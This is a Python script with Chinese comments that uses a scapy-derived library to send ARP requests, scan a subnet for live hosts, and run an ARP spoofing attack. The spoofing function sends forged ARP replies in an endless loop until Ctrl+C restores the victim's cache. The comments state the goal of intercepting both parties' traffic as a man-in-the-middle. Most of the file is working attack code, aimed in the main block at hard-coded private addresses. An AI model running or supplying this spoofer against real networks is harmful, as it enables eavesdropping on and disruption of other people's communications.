# -*- encoding: utf-8 -*-
"""
@File           : myarp
@Time           : 2019/12/22
@Author         : flack
@Email          : opencoding@hotmail.com
@ide            : PyCharm
@project        : MyTest
@description    : 描述
"""
import logging
import ipaddress
import time
import signal
from kamene.all import *
from multiprocessing.pool import ThreadPool
from MyTools.ipaddress import *

logging.getLogger("kamene.runtime").setLevel(logging.ERROR)


def arp_request(dst_addr, ifname):
    local_ip = get_ip_address_lan()
    local_mac = get_mac_address()
    try:
        # 发送ARP请求并等待响应
        # op=1表示请求，op=2表示响应
        # 当op=1,hwsrc=表示本地mac，hwdst表示广播(首包)，psrc表示本地IP，pdst表示目的IP
        result_raw = sr1(ARP(
            op=1,
            hwsrc=local_mac,
            hwdst='00:00:00:00:00:00',
            psrc=local_ip,
            pdst=dst_addr
        ), iface='', timeout=1, verbose=False)
        print(result_raw.show())
        # 返回目的IP地址，和目的MAC地址，getlayer(ARP)取整个ARP数据包
        return dst_addr, result_raw.getlayer(ARP).fields.get('hwsrc')

    except Exception as ex:
        print(ex)
        return dst_addr, None


def arp_scan(network, ifname):
    # 要扫描的网段
    net = ipaddress.ip_network(network, strict=False)
    # 空列表，存放字符串IP地址
    ip_list = []
    for ip in net:
        ip_list.append(str(ip))  # ip格式转为str，放入ip_list

    pool = ThreadPool(processes=100)  # 线程池并发100
    result = []
    for i in ip_list:
        result.append(pool.apply_async(arp_request, args=(i, ifname)))
    pool.close()
    pool.join()

    # 存放活跃的IP与MAC的字典
    scan_dict = {}
    for r in result:
        if r.get()[1] is not None:
            scan_dict[r.get()[0]] = r.get()[1]
    # print(scan_dict)
    return scan_dict


def arp_spoof(ip_1, ip_2, ifname='ens35'):
    # 申明全局变量
    global localip, localmac, dst_1_ip, dst_1_mac, dst_2_ip, dst_2_mac, local_ifname

    # 赋值到全局变量
    # dst_1_ip为被毒化ARP设备的IP地址，dst_ip_2为本机伪装设备的IP地址
    # local_ifname为攻击者使用的网口名字
    dst_1_ip, dst_2_ip, local_ifname = ip_1, ip_2, ifname

    # 获取本机IP和MAC地址，并且赋值到全局变量
    localip, localmac = get_ip_address(ifname), get_mac_address(ifname)

    # 获取被欺骗ip_1的MAC地址，真实网关ip_2的MAC地址
    dst_1_mac, dst_2_mac = arp_request(ip_1, ifname)[1], arp_request(ip_2, ifname)[1]

    # 引入信号处理机制，如果出现ctl+c（signal.SIGINT），使用sigint_handler这个方法进行处理
    signal.signal(signal.SIGINT, sigint_handler)

    while True:  # 一直攻击，直到ctl+c出现！！！
        # op=2,响应ARP
        sendp(Ether(src=localmac, dst=dst_1_mac) / ARP(op=2, hwsrc=localmac, hwdst=dst_1_mac, psrc=dst_2_ip,
                                                       pdst=dst_1_ip),
              iface=scapy_iface(local_ifname),
              verbose=False)

        print("发送ARP欺骗数据包！欺骗{} , {}的MAC地址已经是我本机{}的MAC地址啦!!!".format(ip_1, ip_2, ifname))
        time.sleep(1)


# 定义处理方法
def sigint_handler(signum, frame):
    # 申明全局变量
    global localip, localmac, dst_1_ip, dst_1_mac, dst_2_ip, dst_2_mac, local_ifname

    print("\n执行恢复操作！！！")
    # 发送ARP数据包，恢复被毒化设备的ARP缓存
    sendp(
        Ether(src=dst_2_mac, dst=dst_1_mac) / ARP(op=2, hwsrc=dst_2_mac, hwdst=dst_1_mac, psrc=dst_2_ip, pdst=dst_1_ip),
        iface=scapy_iface(local_ifname),
        verbose=False)
    print("已经恢复 {} 的ARP缓存啦".format(dst_1_ip))
    # 退出程序，跳出while True
    sys.exit()


if __name__ == '__main__':
    # Windows Linux均可使用
    # arp_result = arp_request('192.168.100.1', "WLAN")
    arp_result = arp_request('192.168.0.1', "wlan")
    print("IP地址:", arp_result[0], "MAC地址:", arp_result[1])

    #
    #
    net = '192.168.8.0/24'
    name = 'ens32'
    start_time = time.time()
    print("活动IP地址如下：")
    for ip, mac in arp_scan(network=net, ifname=name).items():
        print("IP地址： {} 是活动的，MAC地址是 {}".format(ip, mac))
    end_time = time.time()
    print('本次扫描花费时间：%.2f' % (end_time - start_time))

    #
    #
    # 欺骗192.168.1.101,让它认为192.168.1.102的MAC地址为本机攻击者的MAC
    # 如果攻击者没有路由通信就会中断，如有路由就可以窃取双方通信的信息(所谓中间人)
    arp_spoof('192.168.1.101', '192.168.1.102', 'ens35')

